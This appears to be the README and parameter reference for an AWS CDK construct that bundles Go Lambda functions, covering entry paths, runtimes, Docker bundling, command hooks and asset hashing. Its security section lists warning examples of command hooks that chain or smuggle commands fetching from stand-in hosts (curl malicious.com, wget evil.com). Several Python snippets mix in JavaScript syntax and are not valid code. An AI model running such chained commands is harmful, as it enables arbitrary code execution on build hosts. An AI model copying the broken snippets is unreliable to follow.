This library provides constructs for Golang Lambda functions.

To use this module you will either need to have `Go` installed (`go1.11` or later) or `Docker` installed.
See [Local Bundling](#local-bundling)/[Docker Bundling](#docker-bundling) for more information.

This module also requires that your Golang application is
using a Go version >= 1.11 and is using [Go modules](https://golang.org/ref/mod).

## Go Function

Define a `GoFunction`:

```python
go.GoFunction(self, "handler",
    entry="lambda-app/cmd/api"
)
```

By default, if `entry` points to a directory, then the construct will assume there is a Go entry file (i.e. `main.go`).
Let's look at an example Go project:

```bash
lambda-app
├── cmd
│   └── api
│       └── main.go
├── go.mod
├── go.sum
├── pkg
│   ├── auth
│   │   └── auth.go
│   └── middleware
│       └── middleware.go
└── vendor
    ├── github.com
    │   └── aws
    │       └── aws-lambda-go
    └── modules.txt
```

With the above layout I could either provide the `entry` as `lambda-app/cmd/api` or `lambda-app/cmd/api/main.go`, either will work.
When the construct builds the golang binary this will be translated `go build ./cmd/api` & `go build ./cmd/api/main.go` respectively.
The construct will figure out where it needs to run the `go build` command from, in this example it would be from
the `lambda-app` directory. It does this by determining the [mod file path](#mod-file-path), which is explained in the
next section.

### mod file path

The `GoFunction` tries to automatically determine your project root, that is
the root of your golang project. This is usually where the top level `go.mod` file or
`vendor` folder of your project is located. When bundling in a Docker container, the
`moduleDir` is used as the source (`/asset-input`) for the volume mounted in
the container.

The CDK will walk up parent folders starting from
the current working directory until it finds a folder containing a `go.mod` file.

Alternatively, you can specify the `moduleDir` prop manually. In this case you
need to ensure that this path includes `entry` and any module/dependencies used
by your function. Otherwise bundling will fail.

## Runtime

The `GoFunction` can be used with either the `GO_1_X` runtime or the provided runtimes (`PROVIDED`/`PROVIDED_AL2`).
By default it will use the `PROVIDED_AL2` runtime. The `GO_1_X` runtime does not support things like
[Lambda Extensions](https://docs.aws.amazon.com/lambda/latest/dg/using-extensions.html), whereas the provided runtimes do.
The [aws-lambda-go](https://github.com/aws/aws-lambda-go) library has built in support for the provided runtime as long as
you name the handler `bootstrap` (which we do by default).

## Dependencies

The construct will attempt to figure out how to handle the dependencies for your function. It will
do this by determining whether or not you are vendoring your dependencies. It makes this determination
by looking to see if there is a `vendor` folder at the [mod file path](#mod-file-path).

With this information the construct can determine what commands to run. You will
generally fall into two scenarios:

1. You are using vendoring (indicated by the presence of a `vendor` folder)
   In this case `go build` will be run with `-mod=vendor` set
2. You are not using vendoring (indicated by the absence of a `vendor` folder)
   If you are not vendoring then `go build` will be run without `-mod=vendor`
   since the default behavior is to download dependencies

All other properties of `lambda.Function` are supported, see also the [AWS Lambda construct library](https://github.com/aws/aws-cdk/tree/main/packages/aws-cdk-lib/aws-lambda).

## Environment

By default the following environment variables are set for you:

* `GOOS=linux`
* `GOARCH`: based on the target architecture of the Lambda function
* `GO111MODULE=on`

Use the `environment` prop to define additional environment variables when go runs:

```python
go.GoFunction(self, "handler",
    entry="app/cmd/api",
    bundling=go.BundlingOptions(
        environment={
            "HELLO": "WORLD"
        }
    )
)
```

## Local Bundling

If `Go` is installed locally and the version is >= `go1.11` then it will be used to bundle your code in your environment. Otherwise, bundling will happen in a [Lambda compatible Docker container](https://gallery.ecr.aws/sam/build-provided.al2023) with the Docker platform based on the target architecture of the Lambda function.

For macOS the recommended approach is to install `Go` as Docker volume performance is really poor.

`Go` can be installed by following the [installation docs](https://golang.org/doc/install).

## Docker

To force bundling in a docker container even if `Go` is available in your environment, set the `forceDockerBundling` prop to `true`. This is useful if you want to make sure that your function is built in a consistent Lambda compatible environment.

Use the `buildArgs` prop to pass build arguments when building the bundling image:

```python
go.GoFunction(self, "handler",
    entry="app/cmd/api",
    bundling=go.BundlingOptions(
        build_args={
            "HTTPS_PROXY": "https://127.0.0.1:3001"
        }
    )
)
```

Use the `bundling.dockerImage` prop to use a custom bundling image:

```python
go.GoFunction(self, "handler",
    entry="app/cmd/api",
    bundling=go.BundlingOptions(
        docker_image=DockerImage.from_build("/path/to/Dockerfile")
    )
)
```

Use the `bundling.goBuildFlags` prop to pass additional build flags to `go build`:

```python
go.GoFunction(self, "handler",
    entry="app/cmd/api",
    bundling=go.BundlingOptions(
        go_build_flags=["-ldflags \"-s -w\""]
    )
)
```

**⚠️ Security Warning**: Build flags are passed directly to the Go build command and can execute arbitrary commands during bundling. Only use trusted values and avoid flags like `-toolexec` with untrusted arguments. Be especially cautious with third-party CDK constructs that may contain malicious build flags. The CDK will display a warning during synthesis when `goBuildFlags` is used.

By default this construct doesn't use any Go module proxies. This is contrary to
a standard Go installation, which would use the Google proxy by default. To
recreate that behavior, do the following:

```python
go.GoFunction(self, "GoFunction",
    entry="app/cmd/api",
    bundling=go.BundlingOptions(
        go_proxies=[go.GoFunction.GOOGLE_GOPROXY, "direct"]
    )
)
```

You can set additional Docker options to configure the build environment:

```python
from aws_cdk import DockerVolume
go.GoFunction(self, "GoFunction",
    entry="app/cmd/api",
    bundling=go.BundlingOptions(
        network="host",
        security_opt="no-new-privileges",
        user="user:group",
        volumes_from=["777f7dc92da7"],
        volumes=[DockerVolume(host_path="/host-path", container_path="/container-path")]
    )
)
```

## Command hooks

It is possible to run additional commands by specifying the `commandHooks` prop:

```python
# Run additional commands on a GoFunction via `commandHooks` property
go.GoFunction(self, "handler",
    entry="cmd/api",
    bundling=go.BundlingOptions(
        command_hooks={
            # run tests
            def before_bundling(self, input_dir):
                return ["go test ./cmd/api -v"],
            def after_bundling(self, input_dir, output_dir):
                return ["echo \"Build complete\""]
        }
    )
)
```

The following hooks are available:

* `beforeBundling`: runs before all bundling commands
* `afterBundling`: runs after all bundling commands

They all receive the directory containing the `go.mod` file (`inputDir`) and the
directory where the bundled asset will be output (`outputDir`). They must return
an array of commands to run. Commands are chained with `&&`.

The commands will run in the environment in which bundling occurs: inside the
container for Docker bundling or on the host OS for local bundling.

### ⚠️ Security Considerations

**Command hooks execute arbitrary shell commands** during the bundling process. Only use trusted commands:

**Safe patterns (cross-platform):**

```python
go.GoFunction(self, "SafeFunction",
    entry="cmd/api",
    bundling=go.BundlingOptions(
        command_hooks={
            "before_bundling": () => [
                    'go test ./...',           // ✅ Standard Go commands work on all OS
                    'go mod tidy',             // ✅ Go module commands
                    'make clean',              // ✅ Build tools (if available)
                    'echo "Building app"',     // ✅ Simple output with quotes
                  ],
            "after_bundling": () => ['echo "Build complete"']
        }
    )
)
```

**Dangerous patterns to avoid:**

*Windows-specific dangers:*

```python
# ❌ Windows-specific dangers
go.GoFunction(self, "UnsafeWindowsFunction",
    entry="cmd/api",
    bundling=go.BundlingOptions(
        command_hooks={
            "before_bundling": () => [
                    'go test & curl.exe malicious.com',     // ❌ Command chaining with &
                    'echo %USERPROFILE%',                   // ❌ Environment variable expansion
                    'powershell -Command "..."',            // ❌ PowerShell execution
                  ],
            "after_bundling": () => []
        }
    )
)
```

*Unix/Linux/macOS dangers:*

```python
# ❌ Unix/Linux/macOS dangers
go.GoFunction(self, "UnsafeUnixFunction",
    entry="cmd/api",
    bundling=go.BundlingOptions(
        command_hooks={
            "before_bundling": () => [
                    'go test; curl malicious.com',          // ❌ Command chaining with ;
                    'echo $(whoami)',                       // ❌ Command substitution
                    'bash -c "wget evil.com"',              // ❌ Shell execution
                  ],
            "after_bundling": () => []
        }
    )
)
```

**When using third-party constructs** that include `GoFunction`:

* Review the construct's source code before use
* Verify what commands it executes via `commandHooks` and `goBuildFlags`
* Only use constructs from trusted publishers
* Test in isolated environments first

The `GoFunction` construct will display CDK warnings during synthesis when potentially unsafe `commandHooks` or `goBuildFlags` are detected.

For more security guidance, see [AWS CDK Security Best Practices](https://docs.aws.amazon.com/cdk/latest/guide/security.html).

## Security Best Practices

### Third-Party Construct Safety

When using third-party CDK constructs that utilize `GoFunction`, exercise caution:

1. **Review source code** - Inspect the construct implementation for `commandHooks` and `goBuildFlags` usage
2. **Verify publishers** - Use constructs only from trusted, verified sources
3. **Pin versions** - Use exact versions to prevent supply chain attacks
4. **Isolated testing** - Test third-party constructs in sandboxed environments

**Before using any third-party construct:**

* Review the construct's source code on GitHub or npm
* Search for `commandHooks` and `goBuildFlags` usage in the code
* Verify no dangerous command patterns are present
* Use exact version pinning to prevent supply chain attacks

The `GoFunction` construct will display CDK warnings during synthesis when potentially unsafe `commandHooks` or `goBuildFlags` are detected.

## Additional considerations

Depending on how you structure your Golang application, you may want to change the `assetHashType` parameter.
By default this parameter is set to `AssetHashType.OUTPUT` which means that the CDK will calculate the asset hash
(and determine whether or not your code has changed) based on the Golang executable that is created.

If you specify `AssetHashType.SOURCE`, the CDK will calculate the asset hash by looking at the folder
that contains your `go.mod` file. If you are deploying a single Lambda function, or you want to redeploy
all of your functions if anything changes, then `AssetHashType.SOURCE` will probably work.

For example, if my app looked like this:

```bash
lambda-app
├── cmd
│   └── api
│       └── main.go
├── go.mod
├── go.sum
└── pkg
    └── auth
        └── auth.go
```

With this structure I would provide the `entry` as `cmd/api` which means that the CDK
will determine that the protect root is `lambda-app` (it contains the `go.mod` file).
Since I only have a single Lambda function, and any update to files within the `lambda-app` directory
should trigger a new deploy, I could specify `AssetHashType.SOURCE`.

On the other hand, if I had a project that deployed multiple Lambda functions, for example:

```bash
lambda-app
├── cmd
│   ├── api
│   │   └── main.go
│   └── anotherApi
│       └── main.go
├── go.mod
├── go.sum
└── pkg
    ├── auth
    │   └── auth.go
    └── middleware
        └── middleware.go
```

Then I would most likely want `AssetHashType.OUTPUT`. With `OUTPUT`
the CDK will only recognize changes if the Golang executable has changed,
and Go only includes dependencies that are used in the executable. So in this case
if `cmd/api` used the `auth` & `middleware` packages, but `cmd/anotherApi` did not, then
an update to `auth` or `middleware` would only trigger an update to the `cmd/api` Lambda
Function.

## Docker based bundling in complex Docker configurations

By default the input and output of Docker based bundling is handled via bind mounts.
In situtations where this does not work, like Docker-in-Docker setups or when using a remote Docker socket, you can configure an alternative, but slower, variant that also works in these situations.

```python
go.GoFunction(self, "GoFunction",
    entry="app/cmd/api",
    bundling=go.BundlingOptions(
        bundling_file_access=BundlingFileAccess.VOLUME_COPY
    )
)
```

        :param asset_hash: (experimental) Specify a custom hash for this asset. If ``assetHashType`` is set it must be set to ``AssetHashType.CUSTOM``. For consistency, this custom hash will be SHA256 hashed and encoded as hex. The resulting hash will be the asset hash. NOTE: the hash is used in order to identify a specific revision of the asset, and used for optimizing and caching deployment activities related to this asset such as packaging, uploading to Amazon S3, etc. If you chose to customize the hash, you will need to make sure it is updated every time the asset changes, or otherwise it is possible that some deployments will not be invalidated. Default: - based on ``assetHashType``
        :param asset_hash_type: (experimental) Determines how the asset hash is calculated. Assets will get rebuilt and uploaded only if their hash has changed. If the asset hash is set to ``OUTPUT`` (default), the hash is calculated after bundling. This means that any change in the output will cause the asset to be invalidated and uploaded. Bear in mind that the go binary that is output can be different depending on the environment that it was compiled in. If you want to control when the output is changed it is recommended that you use immutable build images such as ``public.ecr.aws/bitnami/golang:1.16.3-debian-10-r16``. If the asset hash is set to ``SOURCE``, then only changes to the source directory will cause the asset to rebuild. If your go project has multiple Lambda functions this means that an update to any one function could cause all the functions to be rebuilt and uploaded. Default: - AssetHashType.OUTPUT. If ``assetHash`` is also specified, the default is ``CUSTOM``.
        :param build_args: (experimental) Build arguments to pass when building the bundling image. Default: - no build arguments are passed
        :param bundling_file_access: (experimental) Which option to use to copy the source files to the docker container and output files back. Default: - BundlingFileAccess.BIND_MOUNT

        :param command_hooks: (experimental) Command hooks. ⚠️ **Security Warning**: Commands are executed directly in the shell environment. Only use trusted commands from verified sources. Avoid shell metacharacters that could enable command injection attacks. Default: - do not run additional commands

        :param forced_docker_bundling: (experimental) Force bundling in a Docker container even if local bundling is possible. Default: - false
        :param go_build_flags: (experimental) List of additional flags to use while building. For example: ['ldflags "-s -w"'] ⚠️ **Security Warning**: These flags are passed directly to the Go build command. Only use trusted values as they can execute arbitrary commands during bundling. Avoid flags like ``-toolexec`` with untrusted arguments, and be cautious with third-party CDK constructs that may contain malicious build flags. Default: - none
        :param go_proxies: (experimental) What Go proxies to use to fetch the packages involved in the build. Pass a list of proxy addresses in order, and/or the string ``'direct'`` to attempt direct access. By default this construct uses no proxies, but a standard Go install would use the Google proxy by default. To recreate that behavior, do the following:: new go.GoFunction(this, 'GoFunction', { entry: 'app/cmd/api', bundling: { goProxies: [go.GoFunction.GOOGLE_GOPROXY, 'direct'], }, }); Default: - Direct access

        :param scope: -
        :param id: -
        :param entry: (experimental) The path to the folder or file that contains the main application entry point files for the project. This accepts either a path to a directory or file. If a directory path is provided then it will assume there is a Go entry file (i.e. ``main.go``) and will construct the build command using the directory path. For example, if you provide the entry as:: entry: 'my-lambda-app/cmd/api' Then the ``go build`` command would be:: `go build ./cmd/api` If a path to a file is provided then it will use the filepath in the build command. For example, if you provide the entry as:: entry: 'my-lambda-app/cmd/api/main.go' Then the ``go build`` command would be:: `go build ./cmd/api/main.go`
        :param bundling: (experimental) Bundling options. Default: - use default bundling options
        :param module_dir: (experimental) Directory containing your go.mod file. This will accept either a directory path containing a ``go.mod`` file or a filepath to your ``go.mod`` file (i.e. ``path/to/go.mod``). This will be used as the source of the volume mounted in the Docker container and will be the directory where it will run ``go build`` from. Default: - the path is found by walking up parent directories searching for a ``go.mod`` file from the location of ``entry``
        :param runtime: (experimental) The runtime environment. Only runtimes of the Golang family and provided family are supported. Default: lambda.Runtime.PROVIDED_AL2
        :param adot_instrumentation: Specify the configuration of AWS Distro for OpenTelemetry (ADOT) instrumentation. Default: - No ADOT instrumentation
        :param allow_all_ipv6_outbound: Whether to allow the Lambda to send all ipv6 network traffic. If set to true, there will only be a single egress rule which allows all outbound ipv6 traffic. If set to false, you must individually add traffic rules to allow the Lambda to connect to network targets using ipv6. Do not specify this property if the ``securityGroups`` or ``securityGroup`` property is set. Instead, configure ``allowAllIpv6Outbound`` directly on the security group. Default: false
        :param allow_all_outbound: Whether to allow the Lambda to send all network traffic (except ipv6). If set to false, you must individually add traffic rules to allow the Lambda to connect to network targets. Do not specify this property if the ``securityGroups`` or ``securityGroup`` property is set. Instead, configure ``allowAllOutbound`` directly on the security group. Default: true
        :param allow_public_subnet: Lambda Functions in a public subnet can NOT access the internet. Use this property to acknowledge this limitation and still place the function in a public subnet. Default: false
        :param application_log_level: (deprecated) Sets the application log level for the function. Default: "INFO"
        :param application_log_level_v2: Sets the application log level for the function. Default: ApplicationLogLevel.INFO
        :param architecture: The system architectures compatible with this lambda function. Default: Architecture.X86_64
        :param code_signing_config: Code signing config associated with this function. Default: - Not Sign the Code
        :param current_version_options: Options for the ``lambda.Version`` resource automatically created by the ``fn.currentVersion`` method. Default: - default options as described in ``VersionOptions``
        :param dead_letter_queue: The SQS queue to use if DLQ is enabled. If SNS topic is desired, specify ``deadLetterTopic`` property instead. Default: - SQS queue with 14 day retention period if ``deadLetterQueueEnabled`` is ``true``
        :param dead_letter_queue_enabled: Enabled DLQ. If ``deadLetterQueue`` is undefined, an SQS queue with default options will be defined for your Function. Default: - false unless ``deadLetterQueue`` is set, which implies DLQ is enabled.
        :param dead_letter_topic: The SNS topic to use as a DLQ. Note that if ``deadLetterQueueEnabled`` is set to ``true``, an SQS queue will be created rather than an SNS topic. Using an SNS topic as a DLQ requires this property to be set explicitly. Default: - no SNS topic
        :param description: A description of the function. Default: - No description.
        :param durable_config: The durable configuration for the function. If durability is added to an existing function, a resource replacement will be triggered. See the 'durableConfig' section in the module README for more details. Default: - No durable configuration
        :param environment: Key-value pairs that Lambda caches and makes available for your Lambda functions. Use environment variables to apply configuration changes, such as test and production environment configurations, without changing your Lambda function source code. Default: - No environment variables.
        :param environment_encryption: The AWS KMS key that's used to encrypt your function's environment variables. Default: - AWS Lambda creates and uses an AWS managed customer master key (CMK).
        :param ephemeral_storage_size: The size of the function’s /tmp directory in MiB. Default: 512 MiB
        :param events: Event sources for this function. You can also add event sources using ``addEventSource``. Default: - No event sources.
        :param filesystem: The filesystem configuration for the lambda function. Default: - will not mount any filesystem
        :param function_name: A name for the function. Default: - AWS CloudFormation generates a unique physical ID and uses that ID for the function's name. For more information, see Name Type.
        :param initial_policy: Initial policy statements to add to the created Lambda Role. You can call ``addToRolePolicy`` to the created lambda to add statements post creation. Default: - No policy statements are added to the created Lambda role.
        :param insights_version: Specify the version of CloudWatch Lambda insights to use for monitoring. Default: - No Lambda Insights
        :param ipv6_allowed_for_dual_stack: Allows outbound IPv6 traffic on VPC functions that are connected to dual-stack subnets. Only used if 'vpc' is supplied. Default: false
        :param layers: A list of layers to add to the function's execution environment. You can configure your Lambda function to pull in additional code during initialization in the form of layers. Layers are packages of libraries or other dependencies that can be used by multiple functions. Default: - No layers.
        :param log_format: (deprecated) Sets the logFormat for the function. Default: "Text"
        :param logging_format: Sets the loggingFormat for the function. Default: LoggingFormat.TEXT
        :param log_group: The log group the function sends logs to. By default, Lambda functions send logs to an automatically created default log group named /aws/lambda/<function name>. However you cannot change the properties of this auto-created log group using the AWS CDK, e.g. you cannot set a different log retention. Use the ``logGroup`` property to create a fully customizable LogGroup ahead of time, and instruct the Lambda function to send logs to it. Providing a user-controlled log group was rolled out to commercial regions on 2023-11-16. If you are deploying to another type of region, please check regional availability first. Default: ``/aws/lambda/${this.functionName}`` - default log group created by Lambda
        :param log_removal_policy: (deprecated) Determine the removal policy of the log group that is auto-created by this construct. Normally you want to retain the log group so you can diagnose issues from logs even after a deployment that no longer includes the log group. In that case, use the normal date-based retention policy to age out your logs. Default: RemovalPolicy.Retain
        :param log_retention: (deprecated) The number of days log events are kept in CloudWatch Logs. When updating this property, unsetting it doesn't remove the log retention policy. To remove the retention policy, set the value to ``INFINITE``. This is a legacy API and we strongly recommend you move away from it if you can. Instead create a fully customizable log group with ``logs.LogGroup`` and use the ``logGroup`` property to instruct the Lambda function to send logs to it. Migrating from ``logRetention`` to ``logGroup`` will cause the name of the log group to change. Users and code and referencing the name verbatim will have to adjust. In AWS CDK code, you can access the log group name directly from the LogGroup construct:: import * as logs from 'aws-cdk-lib/aws-logs'; declare const myLogGroup: logs.LogGroup; myLogGroup.logGroupName; Default: logs.RetentionDays.INFINITE
        :param log_retention_retry_options: When log retention is specified, a custom resource attempts to create the CloudWatch log group. These options control the retry policy when interacting with CloudWatch APIs. This is a legacy API and we strongly recommend you migrate to ``logGroup`` if you can. ``logGroup`` allows you to create a fully customizable log group and instruct the Lambda function to send logs to it. Default: - Default AWS SDK retry options.
        :param log_retention_role: The IAM role for the Lambda function associated with the custom resource that sets the retention policy. This is a legacy API and we strongly recommend you migrate to ``logGroup`` if you can. ``logGroup`` allows you to create a fully customizable log group and instruct the Lambda function to send logs to it. Default: - A new role is created.
        :param memory_size: The amount of memory, in MB, that is allocated to your Lambda function. Lambda uses this value to proportionally allocate the amount of CPU power. For more information, see Resource Model in the AWS Lambda Developer Guide. Default: 128
        :param params_and_secrets: Specify the configuration of Parameters and Secrets Extension. Default: - No Parameters and Secrets Extension
        :param profiling: Enable profiling. Default: - No profiling.
        :param profiling_group: Profiling Group. Default: - A new profiling group will be created if ``profiling`` is set.
        :param recursive_loop: Sets the Recursive Loop Protection for Lambda Function. It lets Lambda detect and terminate unintended recursive loops. Default: RecursiveLoop.Terminate
        :param reserved_concurrent_executions: The maximum of concurrent executions you want to reserve for the function. Default: - No specific limit - account limit.
        :param role: Lambda execution role. This is the role that will be assumed by the function upon execution. It controls the permissions that the function will have. The Role must be assumable by the 'lambda.amazonaws.com' service principal. The default Role automatically has permissions granted for Lambda execution. If you provide a Role, you must add the relevant AWS managed policies yourself. The relevant managed policies are "service-role/AWSLambdaBasicExecutionRole" and "service-role/AWSLambdaVPCAccessExecutionRole". Default: - A unique role will be generated for this lambda function. Both supplied and generated roles can always be changed by calling ``addToRolePolicy``.
        :param runtime_management_mode: Sets the runtime management configuration for a function's version. Default: Auto
        :param security_groups: The list of security groups to associate with the Lambda's network interfaces. Only used if 'vpc' is supplied. Default: - If the function is placed within a VPC and a security group is not specified, either by this or securityGroup prop, a dedicated security group will be created for this function.
        :param snap_start: Enable SnapStart for Lambda Function. SnapStart is currently supported for Java 11, Java 17, Python 3.12, Python 3.13, and .NET 8 runtime Default: - No snapstart
        :param system_log_level: (deprecated) Sets the system log level for the function. Default: "INFO"
        :param system_log_level_v2: Sets the system log level for the function. Default: SystemLogLevel.INFO
        :param tenancy_config: The tenancy configuration for the function. Default: - Tenant isolation is not enabled
        :param timeout: The function execution time (in seconds) after which Lambda terminates the function. Because the execution time affects cost, set this value based on the function's expected execution time. Default: Duration.seconds(3)
        :param tracing: Enable AWS X-Ray Tracing for Lambda Function. Default: Tracing.Disabled
        :param vpc: VPC network to place Lambda network interfaces. Specify this if the Lambda function needs to access resources in a VPC. This is required when ``vpcSubnets`` is specified. Default: - Function is not placed within a VPC.
        :param vpc_subnets: Where to place the network interfaces within the VPC. This requires ``vpc`` to be specified in order for interfaces to actually be placed in the subnets. If ``vpc`` is not specify, this will raise an error. Note: Internet access for Lambda Functions requires a NAT Gateway, so picking public subnets is not allowed (unless ``allowPublicSubnet`` is set to ``true``). Default: - the Vpc default strategy if not specified
        :param max_event_age: The maximum age of a request that Lambda sends to a function for processing. Minimum: 60 seconds Maximum: 6 hours Default: Duration.hours(6)
        :param on_failure: The destination for failed invocations. Default: - no destination
        :param on_success: The destination for successful invocations. Default: - no destination
        :param retry_attempts: The maximum number of times to retry when the function returns an error. Minimum: 0 Maximum: 2 Default: 2

        '''(experimental) Properties for a GolangFunction.

        :param max_event_age: The maximum age of a request that Lambda sends to a function for processing. Minimum: 60 seconds Maximum: 6 hours Default: Duration.hours(6)
        :param on_failure: The destination for failed invocations. Default: - no destination
        :param on_success: The destination for successful invocations. Default: - no destination
        :param retry_attempts: The maximum number of times to retry when the function returns an error. Minimum: 0 Maximum: 2 Default: 2
        :param adot_instrumentation: Specify the configuration of AWS Distro for OpenTelemetry (ADOT) instrumentation. Default: - No ADOT instrumentation
        :param allow_all_ipv6_outbound: Whether to allow the Lambda to send all ipv6 network traffic. If set to true, there will only be a single egress rule which allows all outbound ipv6 traffic. If set to false, you must individually add traffic rules to allow the Lambda to connect to network targets using ipv6. Do not specify this property if the ``securityGroups`` or ``securityGroup`` property is set. Instead, configure ``allowAllIpv6Outbound`` directly on the security group. Default: false
        :param allow_all_outbound: Whether to allow the Lambda to send all network traffic (except ipv6). If set to false, you must individually add traffic rules to allow the Lambda to connect to network targets. Do not specify this property if the ``securityGroups`` or ``securityGroup`` property is set. Instead, configure ``allowAllOutbound`` directly on the security group. Default: true
        :param allow_public_subnet: Lambda Functions in a public subnet can NOT access the internet. Use this property to acknowledge this limitation and still place the function in a public subnet. Default: false
        :param application_log_level: (deprecated) Sets the application log level for the function. Default: "INFO"
        :param application_log_level_v2: Sets the application log level for the function. Default: ApplicationLogLevel.INFO
        :param architecture: The system architectures compatible with this lambda function. Default: Architecture.X86_64
        :param code_signing_config: Code signing config associated with this function. Default: - Not Sign the Code
        :param current_version_options: Options for the ``lambda.Version`` resource automatically created by the ``fn.currentVersion`` method. Default: - default options as described in ``VersionOptions``
        :param dead_letter_queue: The SQS queue to use if DLQ is enabled. If SNS topic is desired, specify ``deadLetterTopic`` property instead. Default: - SQS queue with 14 day retention period if ``deadLetterQueueEnabled`` is ``true``
        :param dead_letter_queue_enabled: Enabled DLQ. If ``deadLetterQueue`` is undefined, an SQS queue with default options will be defined for your Function. Default: - false unless ``deadLetterQueue`` is set, which implies DLQ is enabled.
        :param dead_letter_topic: The SNS topic to use as a DLQ. Note that if ``deadLetterQueueEnabled`` is set to ``true``, an SQS queue will be created rather than an SNS topic. Using an SNS topic as a DLQ requires this property to be set explicitly. Default: - no SNS topic
        :param description: A description of the function. Default: - No description.
        :param durable_config: The durable configuration for the function. If durability is added to an existing function, a resource replacement will be triggered. See the 'durableConfig' section in the module README for more details. Default: - No durable configuration
        :param environment: Key-value pairs that Lambda caches and makes available for your Lambda functions. Use environment variables to apply configuration changes, such as test and production environment configurations, without changing your Lambda function source code. Default: - No environment variables.
        :param environment_encryption: The AWS KMS key that's used to encrypt your function's environment variables. Default: - AWS Lambda creates and uses an AWS managed customer master key (CMK).
        :param ephemeral_storage_size: The size of the function’s /tmp directory in MiB. Default: 512 MiB
        :param events: Event sources for this function. You can also add event sources using ``addEventSource``. Default: - No event sources.
        :param filesystem: The filesystem configuration for the lambda function. Default: - will not mount any filesystem
        :param function_name: A name for the function. Default: - AWS CloudFormation generates a unique physical ID and uses that ID for the function's name. For more information, see Name Type.
        :param initial_policy: Initial policy statements to add to the created Lambda Role. You can call ``addToRolePolicy`` to the created lambda to add statements post creation. Default: - No policy statements are added to the created Lambda role.
        :param insights_version: Specify the version of CloudWatch Lambda insights to use for monitoring. Default: - No Lambda Insights
        :param ipv6_allowed_for_dual_stack: Allows outbound IPv6 traffic on VPC functions that are connected to dual-stack subnets. Only used if 'vpc' is supplied. Default: false
        :param layers: A list of layers to add to the function's execution environment. You can configure your Lambda function to pull in additional code during initialization in the form of layers. Layers are packages of libraries or other dependencies that can be used by multiple functions. Default: - No layers.
        :param log_format: (deprecated) Sets the logFormat for the function. Default: "Text"
        :param logging_format: Sets the loggingFormat for the function. Default: LoggingFormat.TEXT
        :param log_group: The log group the function sends logs to. By default, Lambda functions send logs to an automatically created default log group named /aws/lambda/<function name>. However you cannot change the properties of this auto-created log group using the AWS CDK, e.g. you cannot set a different log retention. Use the ``logGroup`` property to create a fully customizable LogGroup ahead of time, and instruct the Lambda function to send logs to it. Providing a user-controlled log group was rolled out to commercial regions on 2023-11-16. If you are deploying to another type of region, please check regional availability first. Default: ``/aws/lambda/${this.functionName}`` - default log group created by Lambda
        :param log_removal_policy: (deprecated) Determine the removal policy of the log group that is auto-created by this construct. Normally you want to retain the log group so you can diagnose issues from logs even after a deployment that no longer includes the log group. In that case, use the normal date-based retention policy to age out your logs. Default: RemovalPolicy.Retain
        :param log_retention: (deprecated) The number of days log events are kept in CloudWatch Logs. When updating this property, unsetting it doesn't remove the log retention policy. To remove the retention policy, set the value to ``INFINITE``. This is a legacy API and we strongly recommend you move away from it if you can. Instead create a fully customizable log group with ``logs.LogGroup`` and use the ``logGroup`` property to instruct the Lambda function to send logs to it. Migrating from ``logRetention`` to ``logGroup`` will cause the name of the log group to change. Users and code and referencing the name verbatim will have to adjust. In AWS CDK code, you can access the log group name directly from the LogGroup construct:: import * as logs from 'aws-cdk-lib/aws-logs'; declare const myLogGroup: logs.LogGroup; myLogGroup.logGroupName; Default: logs.RetentionDays.INFINITE
        :param log_retention_retry_options: When log retention is specified, a custom resource attempts to create the CloudWatch log group. These options control the retry policy when interacting with CloudWatch APIs. This is a legacy API and we strongly recommend you migrate to ``logGroup`` if you can. ``logGroup`` allows you to create a fully customizable log group and instruct the Lambda function to send logs to it. Default: - Default AWS SDK retry options.
        :param log_retention_role: The IAM role for the Lambda function associated with the custom resource that sets the retention policy. This is a legacy API and we strongly recommend you migrate to ``logGroup`` if you can. ``logGroup`` allows you to create a fully customizable log group and instruct the Lambda function to send logs to it. Default: - A new role is created.
        :param memory_size: The amount of memory, in MB, that is allocated to your Lambda function. Lambda uses this value to proportionally allocate the amount of CPU power. For more information, see Resource Model in the AWS Lambda Developer Guide. Default: 128
        :param params_and_secrets: Specify the configuration of Parameters and Secrets Extension. Default: - No Parameters and Secrets Extension
        :param profiling: Enable profiling. Default: - No profiling.
        :param profiling_group: Profiling Group. Default: - A new profiling group will be created if ``profiling`` is set.
        :param recursive_loop: Sets the Recursive Loop Protection for Lambda Function. It lets Lambda detect and terminate unintended recursive loops. Default: RecursiveLoop.Terminate
        :param reserved_concurrent_executions: The maximum of concurrent executions you want to reserve for the function. Default: - No specific limit - account limit.
        :param role: Lambda execution role. This is the role that will be assumed by the function upon execution. It controls the permissions that the function will have. The Role must be assumable by the 'lambda.amazonaws.com' service principal. The default Role automatically has permissions granted for Lambda execution. If you provide a Role, you must add the relevant AWS managed policies yourself. The relevant managed policies are "service-role/AWSLambdaBasicExecutionRole" and "service-role/AWSLambdaVPCAccessExecutionRole". Default: - A unique role will be generated for this lambda function. Both supplied and generated roles can always be changed by calling ``addToRolePolicy``.
        :param runtime_management_mode: Sets the runtime management configuration for a function's version. Default: Auto
        :param security_groups: The list of security groups to associate with the Lambda's network interfaces. Only used if 'vpc' is supplied. Default: - If the function is placed within a VPC and a security group is not specified, either by this or securityGroup prop, a dedicated security group will be created for this function.
        :param snap_start: Enable SnapStart for Lambda Function. SnapStart is currently supported for Java 11, Java 17, Python 3.12, Python 3.13, and .NET 8 runtime Default: - No snapstart
        :param system_log_level: (deprecated) Sets the system log level for the function. Default: "INFO"
        :param system_log_level_v2: Sets the system log level for the function. Default: SystemLogLevel.INFO
        :param tenancy_config: The tenancy configuration for the function. Default: - Tenant isolation is not enabled
        :param timeout: The function execution time (in seconds) after which Lambda terminates the function. Because the execution time affects cost, set this value based on the function's expected execution time. Default: Duration.seconds(3)
        :param tracing: Enable AWS X-Ray Tracing for Lambda Function. Default: Tracing.Disabled
        :param vpc: VPC network to place Lambda network interfaces. Specify this if the Lambda function needs to access resources in a VPC. This is required when ``vpcSubnets`` is specified. Default: - Function is not placed within a VPC.
        :param vpc_subnets: Where to place the network interfaces within the VPC. This requires ``vpc`` to be specified in order for interfaces to actually be placed in the subnets. If ``vpc`` is not specify, this will raise an error. Note: Internet access for Lambda Functions requires a NAT Gateway, so picking public subnets is not allowed (unless ``allowPublicSubnet`` is set to ``true``). Default: - the Vpc default strategy if not specified
